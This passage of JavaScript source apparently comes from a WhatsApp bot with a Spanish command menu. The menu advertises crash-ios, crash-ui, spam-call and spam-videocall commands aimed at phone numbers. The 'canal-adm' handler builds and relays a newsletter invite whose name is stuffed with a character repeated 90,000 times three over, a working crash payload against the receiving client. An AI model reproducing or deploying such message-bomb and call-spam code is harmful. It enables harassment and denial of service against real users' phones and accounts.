│  \`Hora:\` ${hora}
│  \`Fecha:\` ${data}
│  \`Estado:\` Online
│  \`Dispositivo:\` ${deviceType}
│  \`Plataforma:\` ${os.platform()}
│  \`HostName:\` ${os.hostname()}
╰═════════════════╯
  *LISTA DE COMANDOS*
  ANDORID
> statusbox
> statusdelay
> atraso
> crash-ui
> crash-button
> crash-Chat

> crash-chat
> button
  IOS 
  Crash-ios
> crash-invisible
> crash-ios2 +52xxx
> crash-ios3 +52xxx
> crash-ios4 +52xxx
> home-ios 593xxxx
> catalogo-ios 593xxx
  ADD
> spam-call +593xxx,<cantidad>  
> spam-videocall +593xxx,<cantidad>    
> good 593xxx  
> andro-ios
> canal-adm
> convite
> canal-ios
  OTROS 
> play <nombre>  
> lin
> tt link
> nuke
> tag`,
        footer: `𝐏 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
        buttons: [
            {
                buttonId: '..',
                buttonText: { displayText: '.' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "𝐵𝑂𝑇 𝑉𝐼𝑃",
                        sections: [
                            {
                                title: "INFO",
                                rows: [
                                    {
                                        title: " 《 • INFO • 》",
                                        description: "𝐵𝑂𝑇 𝑉𝐼𝑃",
                                        id: `info`
                                    }
                                ]
                            }
                        ]
                    })
                }
            },
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: m });
break;

case "canal-adm":
const travas = `${"ꦾ".repeat(90000)}`
if (!isBot && !isCreator) return 
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQIBAT8AF//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AF//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`}},{})
break

default:
}

} catch (err) {
 
  console.log(util.format(err))
  let e = String(err)

if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return


}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})}
